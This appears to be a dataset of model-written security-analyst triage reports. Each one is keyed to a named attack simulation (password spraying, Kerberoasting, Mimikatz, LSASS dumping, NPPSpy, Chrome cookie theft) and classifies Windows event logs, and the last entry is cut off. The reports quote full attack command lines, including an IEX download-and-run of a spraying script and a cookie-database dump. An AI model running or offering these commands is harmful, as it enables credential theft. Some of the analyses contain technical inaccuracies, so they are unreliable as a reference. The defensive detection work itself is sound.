Password Spray (DomainPasswordSpray),"After reviewing the provided Windows event logs, I have identified a series of activities that warrant classification as ""MALICIOUS."" Here's a detailed analysis:

### Analysis:

#### Application Log:
- Most entries are routine messages showing Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`).
- The `edgeupdate` service stopping is generally non-stable and may be normal unless happening repeatedly.

#### Windows PowerShell Log:
- A particular PowerShell command was executed which is highly suspicious:
  - Command: `IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force`
  - This command downloads a script from GitHub and executes it using `Invoke-DomainPasswordSpray`, a known password spraying tool. This tool can be used for brute-force password attacks against the domain.

#### Security Log:
- Normal user logon/logoff events are found, as well as special privileges being assigned to the `admin_test` user. The presence of `SeDebugPrivilege` among others, could be suspicious if unwarranted for this user, indicating possible privilege escalation or misuse.
  
#### Sysmon Log:
- Routine entries associated with process creations (`Sysmon Event ID 1`) showing each executed process and its properties.
- Consistent with the PowerShell log, a `WindowsPowerShell` process with the same suspicious command line was flagged:
  - Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
  - CommandLine: Matches the suspicious command observed in the Windows PowerShell logs.

### Conclusion:

- The execution of an external script intended for password spraying over the network is a clear indicator of unauthorized and potentially harmful activity.
- This activity involves downloading and executing a script from the internet without administrative oversight, posing a risk to system and network security.

### Resolution:

**MALICIOUS** - The logs contain clear evidence of malicious activity, specifically the use of a PowerShell script for password spraying, which is a known attack vector.

### Guidance:

1. **Immediate Isolation**: Disconnect the affected host (`Server002`) from the network to prevent further potential spread of the attack.
2. **Forensic Analysis**: Further in-depth forensic investigation should be conducted to identify how the script execution was allowed, and whether any accounts have been compromised.
3. **Credential Auditing and Reset**: Perform a credential audit and consider resetting passwords, particularly for any privileged accounts.
4. **Patch and Update**: Ensure all systems and security definitions are up-to-date to guard against known vulnerabilities.
5. **Monitoring**: Enhance monitoring to detect similar future attempts across the network and apply security policies to restrict unauthorized script execution."
Rubeus kerberoast,"### Analysis of Windows Event Logs

#### Application Logs
The Application logs primarily contain entries related to the state of Windows Defender, indicating that it is on and operational. There is no anomaly or suspicious behavior seen in these entries that would indicate malicious activity.

#### Windows PowerShell Logs
The PowerShell logs reveal suspicious behavior:
1. Execution of `rubeus.exe` with the `kerberoast` command indicates potential Kerberos ticket extraction, often associated with lateral movement or privilege escalation tactics used by attackers.
2. The command line used includes the execution of external executable via `cmd.exe`, which is an unusual combination and suspicious in nature.

This activity is suspicious and warrants further investigation to determine whether this was an intended administrative task or indicative of malicious behavior.

#### Sysmon Logs
Several key points of interest:
1. **Processes Involved**: Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`, which align with legitimate system activity unless seen in conjunction with suspicious activities, such as manipulation or clearing event logs.
2. **Execution Chain**: The process chain involving `cmd.exe` launching `rubeus.exe` reinforces the suspicion from the PowerShell logs. This is associated with attempts to exploit Kerberos protocol vulnerabilities.
3. **Powershell Execution**: The script indicates the command to purge Kerberos tickets (`klist purge`), which cleans the ticket cache - commonly done to avoid cached tickets being reused potentially by malicious actors.
4. **Service and Software Installations**: There are regular updates and installations associated with Microsoft Edge Update, characterized by execution paths and system level privileges, which appear legitimate and expected behavior.

### Conclusion and Resolution

#### Assessment:
- The presence of `rubeus.exe` and the specific execution command of `kerberoast` strongly indicate testing or possible malicious activity aimed at exploiting Kerberos authentication in the environment.
- While other log entries like software updates appear benign and normal, the combination of PowerShell and Sysmon log activities clearly depicts an incident warranting deeper investigation.

#### Threats/Risks:
- Possible compromise with an attempt of credential theft through Kerberos ticket extraction.
- Potential lateral movement capabilities within the network if the activity is indeed malicious.

#### Guidance:
1. **Immediate Actions**:
   - Validate whether the usage of `rubeus.exe` was authorized by your IT team or running any penetration tests.
   - Consider isolating the affected system until further evaluation.
   - Examine surrounding network and authentication logs to track any unauthorized access or data exfiltration attempts.

2. **Investigation**:
   - Review and monitor other systems for similar activities.

3. **Prevention**:
   - Strengthen Kerberos policies and monitor all ticket-granting service requests.
   - Ensure system and software updates are centralized and monitored for unauthorized changes.

### Resolution: **MALICIOUS**

The analysis concludes that the activity involving `rubeus.exe` and the kerberoast command is highly suggestive of malicious intent aimed at credential-stealing. Prompt action should be taken to verify and mitigate this potential threat."
Extract Windows Credential Manager via VBA,"Based on the provided logs across different channels – Application, Security, Windows PowerShell, Sysmon, and System – here's the detailed assessment and conclusion on potential malicious activities:

1. **Application Log:**
   - The ""edgeupdate"" service stopped twice in quick succession. This could be routine, but combined with further analysis, it might be relevant.

2. **Security Log:**
   - The events with EventID 4616 indicate time change events initiated by the LOCAL SERVICE account. Frequent time changes could be suspicious in certain contexts, although benign scenarios exist (like standard time synchronization processes).

3. **Windows PowerShell Log:**
   - Logs indicate potentially malicious PowerShell activity, notably execution of a script from a seemingly suspicious URL (""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1""). This invocation with `Invoke-Maldoc` is a strong indicator of malicious activity (often associated with malware delivery or execution via macro-laden documents).

4. **Sysmon Log:**
   - Multiple executions of PowerShell with suspicious command lines were aligned with malicious PowerShell activity from the previous log.
   - Consistent running of Microsoft Edge Update executables by the SYSTEM user in various directories might appear to be normal operations, but given the context of potentially malicious scripts, it raises suspicion of attempts at masquerading or leveraging legitimate processes for malicious purposes.

5. **System Log:**
   - Time change events correspond with the Security log entries and can sometimes be used to cover tracks by aligning timestamps across log types.

**Assessment:**
- The PowerShell expressions invoking remote scripts from URLs and executing them locally is a significant red flag. The PowerShell logs, in conjunction with Sysmon logs, strongly suggest attempts at executing or simulating malicious activities (potential exploitation or a malware dropper).
- EdgeUpdate operations might be legitimate; however, the patterns might indicate abuse for covering malicious activities or persistence mechanisms, especially when considered with other log findings.

**Conclusion: MALICIOUS**
Given your expertise and training as a senior analyst, the collected evidence from logs clearly indicates malicious activity. Immediate steps should include isolating the host for deeper forensic analysis, reviewing network traffic for other signs of compromise, blocking the suspicious URLs at the firewall/proxy level, and alerting the necessary teams for incident response to mitigate further damage.

**Guidance on Proceeding:**
1. **Isolate the Host:** Prevent potential lateral movement or further data exfiltration.
2. **Conduct Full System Scans:** Utilize AV and EDR solutions.
3. **Network Monitoring:** Check for unusual network communications related to the suspicious URL.
4. **Review EdgeUpdate Executions:** Verify if these processes or installations are modified or leveraged by malicious actors.
5. **Historical Analysis:** Review historical logs to determine when the malicious activity began and its extent.

Ensure to document findings and coordinate with the incident response team for immediate action."
Dump LSASS.exe using imported Microsoft DLLs,"Upon analyzing the provided Windows event logs, several incidents stand out as potentially malicious activities. Let's break down the logs to identify these activities:

1. **Use of PowerShell:**
   - The Sysmon logs reveal the execution of `powershell.exe` with the command: `powershell.exe"" & {C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.data.001.dmp -x 0x41}`. This command involves `xordump.exe`, which is being used to create a dump of memory from `lsass.exe`, a process known to store sensitive information like passwords and tokens. Dumping the memory of `lsass.exe` is a well-known tactic used in credential theft attacks.
   - PowerShell is a powerful scripting language used by both administrators and attackers; however, such usage, especially involving `lsass.exe`, is typically considered a red flag.

2. **Sysmon Event Details:**
   - Repeated executions of both `wevtutil.exe` and `conhost.exe` are observed. `wevtutil` is used to manage Windows event logs, and excessive or unexpected usage could indicate log clearing activities, potentially to conceal malicious actions.
   - A series of Sysmon Process Create events (EventID 1) indicate structured scripting activity, primarily under the `admin_test` user account. The pattern mimics automation or scripted execution, possibly to perform reconnaissance or execute malicious scripts swiftly.

3. **Use of Legitimate Tools for Harmful Purposes:**
   - The combination of PowerShell and tools like `xordump.exe` to work against `lsass.exe` aligns with techniques where legitimate tools are used in malicious processes. This is indicative of Living-off-the-Land Binaries (LoLBins), a frequently observed tactic where attackers use built-in tools to perform their operations, making detection more complex.

### Threat Assessment:
Based on the consistent execution of suspicious scripts, particularly those accessing memory dumps, as well as the pattern suggesting potential credential access tactics, the logs present clear indicators of unauthorized access and potential compromise.

### Recommendation:
- **Immediate Action Required:**
  - Isolate the affected machine from the network to prevent further data exfiltration or lateral movement.
  - Conduct a memory dump analysis of `lsass.exe` to confirm any extracted credentials.
  - Engage in comprehensive threat hunting activities across the network to identify similar patterns.
  - Consider strengthening monitoring with alerts for such PowerShell patterns, and implementing application whitelisting to prevent unauthorized tool execution.
  
### Conclusion:
Given the nature of the activities observed in the logs, the resolution classification is:
- **MALICIOUS** - The execution patterns strongly suggest credential access attempts and potential compromise.

Further steps should be aligned with organizational incident response protocols, focusing on containment, eradication, and recovery."
Brute Force Credentials of single Azure AD user,"### Detailed Analysis of the Provided Logs

Upon analyzing the provided Windows event logs, several indicators of potentially malicious activity were identified:

1. **Suspicious Use of PowerShell:**
   - The Sysmon and PowerShell logs show the execution of a PowerShell command with an embedded script attempting to perform a brute force attack against Azure Active Directory (AzureAD) credentials. The script uses a list of passwords to try and connect to the AzureAD account ""bruce.wayne@contoso.com"" using the `Connect-AzureAD` command. 
   - Details from the logs indicate the usage of a PowerShell script to iterate through passwords and attempt connections, which is a clear indicator of a brute force attack designed to compromise credentials.

2. **Processes of Concern:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are launched, which, on their own, might be benign. However, within the context of other suspicious activities, their pattern of rapid execution might indicate an attempt to hijack processes for malicious purposes or as a distraction from the main attack vector.
   - `wevtutil.exe` and `conhost.exe` are known Windows utilities; however, their execution without visible associated administrative tasks is notable. Combined with PowerShell usage, it hints at unauthorized activity possibly for logging manipulation or execution context hiding.

3. **Integrity Level and User Execution:**
   - All the activities noted within the logs, including the suspicious PowerShell script, were executed by a user with 'High' integrity level, under the account `SERVER002\admin_test`. This indicates that the account has administrative rights, which would allow greater impact if compromised by malicious processes.
   - The execution of PowerShell with administrative credentials raises the impact security risks, given the power of PowerShell to conduct system administrative tasks and the risk of malicious scripts.

### Assessment & Threat Identification

- **Malicious Activity Identified:**
  - Based on the evidence of a brute force credential attack against AzureAD using PowerShell, the activity logged indicates intentional compromise attempts. 
  - PowerShell logging showcases command execution that tries looping over passwords, catching failed attempts, and notifying when invalid credentials are used. This behavior aligns with a typical credential-stuffing or brute-force attack.

### Resolution & Guidance

**Final Resolution: MALICIOUS**

Given the logs suggest a clear and structured attempt to compromise credentials using PowerShell, the activity within these logs is categorized as MALICIOUS. **Recommended Actions:**
- **Immediate Response:**
  - Isolate `Server002` from the network to prevent further unauthorized access or lateral movement within the network.
  - Reset all potentially compromised credentials, focusing on active directory accounts, especially the observed `bruce.wayne@contoso.com`.
  
- **Further Investigation:**
  - Investigate the user account `admin_test` for further unauthorized configuration changes, and determine potential points of initial compromise that allowed unauthorized execution of PowerShell scripts.
  - Examine other user accounts for similar anomalous activities in logs.

- **Preventive Measures:**
  - Implement enhanced monitoring for PowerShell execution policies to log all activities, explicitly alerting for downloaded scripts, encoded commands, or scripts accessing sensitive locations.
  - Introduce multi-factor authentication where possible, particularly for administrative accounts and external access points.
  
By addressing the identified threat promptly and implementing security enhancements, the system's protection can be significantly improved against similar threats in the future."
Export Certificates with Mimikatz,"Upon analyzing the provided Windows event logs, here are the key observations:

### Sysmon Logs:

1. **PowerShell Execution**:
    - `powershell.exe` was executed by the user `SERVER002\admin_test`. While PowerShell execution itself is not necessarily suspicious, it can be used for malicious purposes. Unfortunately, details on the commands executed are not available in the logs provided, which prevents a definitive conclusion regarding their intent.

2. **Use of `wevtutil.exe`**:
    - `wevtutil.exe` is a legitimate Windows tool used to manage event logs. It was executed multiple times by `SERVER002\admin_test`. This could be indicative of attempts to read, clear, or manipulate logs, which is a common tactic used by attackers to cover tracks.

3. **Execution of `cmd.exe` with Command Calling `mimikatz.exe`**:
    - This is perhaps the most alarming entry. `cmd.exe` was used to run `mimikatz.exe`, a known tool used for extracting credentials on Windows systems. The command line execution path and the use of Mimikatz clearly indicate the exploitation attempt, possibly to harvest passwords or certificates (`""crypto::certificates /systemstore:local_machine /store:my /export""`).

4. **Process and Parent Process Execution**:
    - The execution of `hostname.exe` and `whoami.exe` were also noted, which are common tools for information gathering within the system environment. Their usage alone is not inherently malicious, but in the context of their relationship with the `mimikatz.exe` execution, they could be part of a broader activity to understand the environment before executing credential theft.

### Application Logs:

1. **Windows Defender State**:
    - Windows Defender was in an ""ON"" state, suggesting that the antivirus was operational during this period. However, despite this, the execution of `mimikatz.exe` suggests either evasion of detection mechanisms or lack of a timely response/alert.

### Security Log:

- Not provided, and as such, we cannot check for detailed authentication success/failure events or user account management activities around the time of this incident.

### Conclusion and Resolution:

Based on the above observations, particularly the execution of `mimikatz.exe`, it can be concluded that the logs reflect activity that is **Malicious**. The use of such a tool is a hallmark of an attempt to compromise the system to access sensitive data like credentials.

### Guidance:

1. **Immediate Actions**:
   - Isolate the affected host from the network.
   - Perform a full forensic investigation to understand the scope of the compromise.
   - Change all credentials associated with the compromised user and any potentially affected accounts.

Credential Dumping with NPPSpy,"Upon reviewing the provided event logs, the following observations and analysis are made:

### PowerShell Logs
- Execution of a PowerShell script that appears to be attempting to:
  - Copy a DLL (`NPPSPY.dll`) to the `C:\Windows\System32` directory.
  - Modify the Windows Registry to include `NPPSpy` in the `PROVIDERORDER`.
  - Create new registry keys and properties under `HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider`.
  - Display a message instructing the user to logout and login again, with a clear warning that cleartext passwords will be stored in `C:\\NPPSpy.txt`.

### Sysmon Logs
- Multiple processes related to Windows utilities like `powershell.exe`, `conhost.exe`, and `wevtutil.exe` are executed.
- A PowerShell command is seen that matches exactly with the one described in the PowerShell logs concerning the `NPPSPY.dll`.
- The presence of `Microsoft Edge` update does not appear related to the PowerShell activity and seems standard.

### Analysis
- The PowerShell script's behavior is highly suspicious. It is attempting to place a DLL in the system directory and modify registry settings, which are typical actions associated with malicious activity such as installing a network provider DLL to intercept network traffic.
- The script explicitly mentions saving cleartext passwords to `C:\\NPPSpy.txt`, which is a direct indicator of malicious intent to harvest credentials.
- There were no benign applications that typically would need to perform such operations, and the actions do not align with typical administrative tasks.

### Assessment
Based on the information in the logs, there is clear evidence of suspicious and malicious activity due to:
- Unauthorized registry manipulation.
- DLL injection into a system directory.
- Explicit logging of user credentials in plain text.

### Resolution
Given the execution of potentially harmful scripts with implications of credential theft, the situation is assessed as:
- **MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Isolation:** Disconnect the affected system from the network to prevent further compromise or lateral movement.
2. **Clear the Threat:** Revoke any untrusted changes made to the system, particularly those related to the PowerShell execution. This includes removing unauthorized registry entries and DLL files.
3. **Forensic Analysis:** Further investigate the origin of the PowerShell script and determine how it was executed on the system.
4. **Password Reset:** Promptly reset passwords for any user accounts potentially affected by this compromise.
5. **Review System Security:** Re-evaluate security measures including software patches, user training, and security software to prevent future breaches.
6. **Report the Incident:** Document and report the incident in accordance with the organization's incident response protocol."
Brute Force:Credential Stuffing using Kerbrute Tool,"Based on the provided Windows event logs, several indicators of suspicious and potentially malicious activity are present. Below is a detailed analysis of the activities observed in the logs:

1. **PowerShell Command Execution:**
   - The Sysmon and Windows PowerShell logs indicate the execution of a PowerShell command that calls `kerbrute.exe`. The command is:
     ```
     ""powershell.exe"" & {cd \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\"", .\kerbrute.exe bruteforce --dc $ENV:userdnsdomain -d $ENV:userdomain \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\bruteforce.txt\""}
     ```
   - `kerbrute.exe` is a known tool for brute-forcing Kerberos service tickets. Its usage in a PowerShell script is highly indicative of malicious intent, potentially attempting unauthorized access within a network.

2. **Process Execution:**
   - Multiple Sysmon events show the execution of various processes by the user `SERVER002\admin_test`, including `wevtutil.exe` and `whoami.exe`. While these by themselves are not inherently malicious, combined with the execution of `kerbrute.exe`, they can be indicative of reconnaissance activities.

3. **Security Logs:**
   - Multiple failed credential access attempts were logged (Event ID: 5379), although unsuccessful, these attempts could signify reconnaissance or brute-force attempts on the system.

4. **Use of Elevated Permissions:**
   - The presence of Event ID: 4624 and 4672 indicates a privileged logon session with special privileges, which might be legitimate, but in the context of executing tools like `kerbrute.exe`, it raises concerns over privilege abuse or escalation.

5. **Windows Defender Logs:**
   - Throughout the timeframe, Windows Defender was active and no logs indicating successful detection of the malicious tool were found, suggesting the tool might evade antivirus detection.

**Assessment:**
The presence and execution of `kerbrute.exe` for brute-forcing credentials combined with the use of PowerShell and elevated permissions signify a considerable threat, indicating attempts to penetrate or gather sensitive information within the network.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Response:**
   - Isolate the compromised host `Server002` from the network to prevent further unauthorized access.
   - Conduct a full forensic analysis of `Server002` to assess the extent of the compromise and identify any data exfiltration.

2. **Remediation Steps:**
   - Remove any identified malicious tools and ensure no persistence mechanisms remain on the system.
   - Change the credentials for sensitive accounts, considering the brute-force attempts observed.
   
3. **Preventive Measures:**
   - Enhance monitoring and logging for unusual command-line usage and process executions.
   - Review and tighten network security policies, particularly around access control and privileged accounts.
   - Conduct security training to raise awareness about the risks of unauthorized tools and scripts.

4. **Post-Incident:**
   - Prepare an incident report detailing the event sequence, impact, and steps taken.
   - Use the event as a case study for future incident response and risk analysis improving the organization's security posture."
LSASS read with pypykatz,"In this analysis of the Sysmon logs provided, I will focus on identifying any suspicious activities, potential indicators of compromise, and assess the risk level based on the events recorded.

### Observations and Analysis:

1. **PowerShell Activity**:
   - The presence of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` executed by `SERVER002\admin_test` could be routine. However, since PowerShell can be leveraged for administrative tasks and malware execution, it's important to investigate further, especially if not typically used by this user.

2. **Weird Process Executions**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed. `wevtutil.exe` is used for managing Event Logs and can be used for stealthy log manipulation or clearing logs, which can be suspicious if frequent and unaccounted for.
   - Execution of these processes in rapid succession might indicate an automated script or malicious tooling.

3. **Use of Legitimate Tools for Potential Malicious Purposes**:
   - We have an execution of `C:\Windows\System32\cmd.exe` with command line `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\venv_data_001\\Scripts\\pypykatz"" live lsa`. This command is running `pypykatz`, a known tool for extracting credentials from the Local Security Authority (LSA) Secrets on Windows. This activity is highly suspicious and potentially indicative of credential theft.

4. **Additional Common Utility Executions**:
   - `C:\Windows\System32\whoami.exe` and `C:\Windows\System32\hostname.exe` executions may be benign, used to ascertain context by an attacker, or automated scripts checking environmental variables.

5. **Integrity Levels**:
   - The processes are running with a high integrity level, which might be expected on administrative accounts but should raise concerns if the account (`admin_test`) is not typically used for such operations.

### Assessment:
- There is a notable execution of `pypykatz`, which is definitely suspicious as it aligns with credential dumping activity.
- The succession of events involving `wevtutil.exe` execution might suggest potential log manipulation operations to cover tracks, especially if combined with malicious intent.

### Resolution:
- **Resolution: MALICIOUS**
  - The command observed involving `pypykatz` is indicative of credential dumping, a commonly malicious activity.
  - Immediate steps should include initiating a deeper investigation to understand the full scope of activity, confirming any unauthorized data access or extraction, and potentially engaging incident response measures.
- **Guidance on How to Proceed**:
  - Confirm the legitimacy of the `SERVER002\admin_test` account and its typical actions.
  - Investigate network logs and other hosts for similar activities.
  - Assess whether sensitive data might have been compromised.
  - Consider credentials resets and broader containment strategies if necessary.
  - Improve monitoring and alerting on execution of tools and artifacts like `pypykatz` and `wevtutil.exe` used in this context."
Cached Credential Dump via Cmdkey,"Upon reviewing the provided Windows event logs, I have conducted an analysis based on interactions with system processes, command line executions, security events, and update activities. Here's an assessment of the situation:

### Summary of Evidence

#### System Log
- Several entries indicate a security intelligence update for Microsoft Defender Antivirus. This is typical behavior as the system is keeping its antivirus definitions up to date. 
- No anomalies identified in these updates.

#### Application Log
- The entry showing ""Windows Defender, SECURITY_PRODUCT_STATE_ON"" indicates that Windows Defender is active. This is normal and expected behavior for system security.

#### Security Log
- **Logon and Privilege Escalation:** Events 4624 and 4672 show a logon of the user `admin_test` with NTLM authentication, which is common - however, the set of privileges listed (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.) could allow for extensive control over the system. The user `admin_test` performing operations with elevated privileges merits further scrutiny.
- **Credential Access Attempts:** Event 5379 indicates unsuccessful attempts at accessing or reading credential information, as shown by the return code `3221225567` or `3221226021`, which suggests potentially unauthorized or failed attempts. These correspond to ""STATUS_LOGON_FAILURE"" due to bad password.

#### Sysmon Log
- **Process Execution:** The execution of Windows tools like `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, and `cmdkey.exe` by the `admin_test` user did not show unexpected command-line arguments. Some are used to list credentials (`cmdkey /list`), which could indicate credential harvesting attempts.
- **Commands related to `cmdkey` and other utilities could imply exploration or enumeration activities being conducted on the machine.**
- **Scheduled Tasks:** `taskhostw.exe` is seen running, which is normal for managing Windows tasks.
- **Windows Defender Update Activity:** Processes such as `wuauclt.exe`, `MpSigStub.exe`, and `AM_Delta.exe` indicate Defender antivirus definitions and updates are being applied, which is normal for systems running Windows Defender.

### Assessment and Guidance
- **BENIGN Activities:** The Defender update processes and scheduled tasks are typical not suggestive of malicious behavior.
- **SUSPICIOUS Activities:**
  - The excessive privileges assigned to `admin_test` combined with NTLM usage and attempts to list credentials are concerning and require more investigation. Access patterns and process executions suggest potential preparatory actions for lateral movement or persistence.
  - Failed credential access attempts (Event 5379) suggest possible unauthorized attempts to gather credentials. These warrant further examination.

### Resolution
Given the analysis, the resolution is **SUSPICIOUS** due to the unusual pattern of the elevated privileges usage, credential hunting, and process enumeration that typically align with exploration or privilege abuse activities. Further investigation into the user `admin_test`, originating IP addresses, and the context of process launches is recommended to determine if these actions are standard or indicative of a potential compromise."
WinPwn - SessionGopher,"Based on the analysis of the provided Windows event logs across System, Application, Windows PowerShell, Sysmon, and Security logs, the key findings are as follows:

1. **Time Synchronization Events:**
   - Multiple events related to time synchronization (EventID: 1, 24 in System log; EventID: 4616 in Security log) showing adjustments to the system time, likely due to regular time synchronization with an NTP server (e.g., time.windows.com). This is normal behavior for maintaining accurate system time.

2. **Windows Defender Status:**
   - Two entries indicating that Windows Defender is active and on (EventID: 15 in Application log), suggesting that antivirus protection is enabled.

3. **PowerShell Activity:**
   - The PowerShell logs show the execution of a script downloaded from an external GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). This activity (EventID: 600 in PowerShell log) suggests that PowerShell was used to execute potentially harmful scripts.
   - The execution of scripts directly from the internet can indicate malicious behavior, especially if involving known offensive security tools like ""WinPwn"".

4. **Sysmon Logs:**
   - The Sysmon logs show legitimate processes such as whoami.exe, conhost.exe, and svchost.exe running, typically associated with normal user and system interactions.
   - However, there's a notable PowerShell execution with the same command line activity as seen in the PowerShell log, indicating potentially malicious usage by exploiting PowerShell capabilities for actions like session enumeration (`sessionGopher`).

5. **Edge Update Activity:**
   - There are numerous entries related to Microsoft Edge update processes (e.g., `MicrosoftEdgeUpdate.exe`). These processes operate under the NT AUTHORITY\SYSTEM account, which is expected during legitimate update operations. There is no indication of misbehavior in these updates from the logs.

**Assessment:**
The most concerning and potentially malicious aspect uncovered is the PowerShell activity, which involves downloading and executing scripts from the internet, specifically from a source associated with security testing or potentially offensive operations. This behavior is often exhibited during penetration testing or by malicious actors attempting to compromise systems.

**Conclusion:**
- **Resolution: MALICIOUS**
  - The PowerShell activity demonstrates definitive malicious behavior due to the execution of scripts from an external, untrusted source that could facilitate unauthorized access or information gathering.
  
**Recommendations:**
- Immediately investigate the context under which the PowerShell scripts were executed. Determine whether it was authorized for security testing purposes or if it indicates unauthorized access.
- Conduct a thorough review of user activity, especially focusing on the user account ""admin_test"", to determine potential compromise.
- Enhance monitoring for abnormal PowerShell usage and consider implementing stricter execution policies to prevent similar incidents.
- Consider isolating the system ""Server002"" for further forensic investigation to ascertain the full extent of potential compromise."
Enumeration for PuTTY Credentials in Registry,"### Detailed Analysis:

#### Security Logs:
1. **EventID 4616**: This event indicates a time change on the system. Multiple entries show slight corrections in time, which are not usually indicative of a security issue on their own unless coordinated with suspicious activity. These changes are associated with `svchost.exe`, a legitimate Windows service host process.

2. **EventID 4634 (Admin Logout)**: This indicates that the user `admin_test` has logged off from the system with Logon ID `0x132AE9`. The logon type is 3, which identifies it as a network logon.

3. **EventID 4672 (Special Privileges Assigned)**: The `admin_test` account was granted a variety of high privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges can be exploited for malicious activities if an account is compromised, but their mere presence isn't immediately suspicious unless used improperly.

4. **EventID 4624 (Admin Logon)**: Indicates a successful network logon using the NTLM authentication method by `admin_test` from workstation `DESKTOP-3HL5B2P`. The use of NTLM is standard in many environments.

#### Sysmon Logs:
1. **Wevtutil & Conhost Executions**: `wevtutil.exe` and `conhost.exe` processes executed multiple times by the `admin_test` user. Wevtutil is used for managing Windows Event Logs. Its use without expected administrative tasks could be suspicious, especially if logs were being tampered with.

2. **Use of Command-Line Tools**: The execution of `hostname.exe`, `whoami.exe`, and a `cmd.exe` instance querying the registry indicates administrative tasks or investigative actions typical of IT maintenance or basic reconnaissance.

3. **Registry Tool**: `reg.exe` was used to query PuTTY sessions, likely checking configurations or stored SSH sessions. If this was unexpected for `admin_test`, it would warrant further investigation.

#### Application Logs:
1. **Edge Update Service**: Logs show regular behavior of Microsoft Edge update service, which stopped and processed updates as observed.

### Assessment:
- **Anomalous Behavior**: The time changes (EventID 4616) and frequent use of command-line tools (`wevtutil`, `cmd.exe`, `reg.exe`) stand out but are not inherently malicious without further context.
- **Potential Risks**: Privileged access (EventID 4672) could become a threat vector if the `admin_test` account were compromised. However, no direct evidence of breach or policy violation.

### Conclusion and Resolution:
- **Resolution**: **SUSPICIOUS** - There are some indicators that require further investigation, such as the intent behind registry queries, frequent administrative command usage, verification of `admin_test` activities, and oversight over the time change activities.
- **Guidance**:  
  - **Verify Justifications**: Confirm with `admin_test` or IT management that the actions were authorized and correlate with expected jobs or tasks.
  - **Monitor Activity**: Inspect `admin_test`'s recent activity logs, particularly around times these events occurred.
  - **Security Measures**: Consider tightening logging and alerting around the use of high privileges and command-line utilities on key systems.

In the absence of further context or evidence of malicious intent, it is critical to conduct these steps to ensure there is no overlooked compromise."
Create Volume Shadow Copy with Powershell,"Upon reviewing the provided event logs from a Windows host, several observations have been made:

### Suspicious Activity

1. **PowerShell Usage**:  
   - There is a PowerShell event indicating the execution of a command `(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')`. This command is used to create a shadow copy of the drive, which can be considered suspicious, especially if not performed for legitimate administrative purposes. Unauthorized usage of shadow copies could indicate data exfiltration attempts or preparation for further malicious activity such as ransomware.

2. **Time Change Events**:  
   - There are time-related events (Event ID 4616) indicating the system clock was changed. Malicious actors sometimes alter system time to evade detection or align logs according to their needs. This raises a flag, especially when combined with other potentially suspicious activity.

3. **VSS (Volume Shadow Copy) Events**:  
   - The logs mention activity associated with VSS (Volume Shadow Copy) services and processes (events involving `vssvc.exe`). This aligns with the PowerShell command seen, further indicating usage of shadow copy services.

### Benign Activity

1. **Windows Update**:  
   - Multiple logs involve Windows Update processes, including updates for the Microsoft Defender Antivirus, which appear legitimate and scheduled.

2. **Admin Level Processes**:
   - The presence of processes like `wuauclt.exe`, `MoUsoCoreWorker.exe`, `AM_Delta.exe`, and `MpSigStub.exe` suggest legitimate administrative and security updates related to Windows services and Microsoft Malware Protection.

3. **Normal System and Security Logs**:
   - Security logs show regular logon events and privilege assignments for the built-in system accounts, which in the given context do not seem out of the ordinary.

### Assessment and Resolution

While the presence of legitimate system activity and updates could suggest normal operation, the PowerShell command indicating shadow copy creation, alongside system clock changes, introduces a degree of suspicion that cannot be overlooked. Given this context, further investigation is warranted to ensure there was no unauthorized attempt at data manipulation or exfiltration.

**Resolution: SUSPICIOUS**

### Guidance

- **Investigate User 'admin_test'**: Verify if the user `SERVER002\admin_test` was authorized to execute such PowerShell commands and if there was a legitimate reason for creating shadow copies during this period.
- **Review Changes to System Time**: Check additional logs or system configurations to understand why the system time was changed and whether this correlates with other suspicious activities.
- **Log Correlation**: Correlate these logs with any external network logs to check for data exfiltration or communication with unauthorized endpoints.
- **Run Endpoint Detection and Response (EDR) Tools**: Use EDR tools to check the timeline and integrity of files in the shadow copies to detect unauthorized manipulation or access.

Further investigation should aim to confirm or rule out any potential malicious activity based on these findings."
Steal Chrome Cookies (Windows),"Based on the analysis of the provided logs, the following observations can be made:

1. **Unusual PowerShell Activity**: The logs show a PowerShell command being executed that involves stopping the Chrome process and extracting cookie data from Chrome's Cookies database using a SQLite tool. The command line used is:
   ```
   ""powershell.exe"" & {stop-process -name \""chrome\"" -force -erroraction silentlycontinue, \""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\"" | cmd /c C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\sqlite-tools-win32-x86-3380200\sqlite3.exe \""$env:localappdata\Google\Chrome\User Data\Default\Network\Cookies\"" | out-file -filepath \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\dataChromeCookies.txt\""}
   ```
   This command is highly suspicious as it involves accessing sensitive data (cookies) in an automated manner, which might be indicative of data exfiltration attempts.

2. **High Integrity Processes**: The processes are executed with high integrity level, showing that they have elevated privileges. This is often a characteristic leveraged by malicious actors to have the full control they need for malicious activities.

3. **Use of SQLite3.exe**: The execution of the SQLite tool from a temporary directory to interact with Chrome's cookie database outside of normal application operations is another indicator of potential malicious activity.

